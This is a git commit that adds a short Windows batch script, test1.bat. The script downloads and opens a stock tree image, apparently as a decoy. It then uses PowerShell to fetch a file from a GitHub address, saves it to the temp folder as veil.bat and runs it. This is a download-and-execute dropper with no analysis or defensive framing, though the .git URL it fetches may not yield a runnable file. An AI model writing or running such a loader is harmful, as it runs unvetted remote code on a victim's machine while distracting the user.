68807b6dbdbc7c32ab60243f7ef25f031f6f9c26
hecker123456 <90962216+hecker123456@users.noreply.github.com>
2021-09-18 03:12:00 -0700

    Add files via upload

---
+++ test1.bat
@@ -0,0 +1,5 @@
+cd %TEMP%
+PowerShell -Command "Invoke-WebRequest 'https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885_960_720.jpg' -OutFile tree.png"
+tree.png
+PowerShell -Command "Invoke-WebRequest 'https://github.com/hecker123456/Test.git' -OutFile veil.bat"
+veil.bat
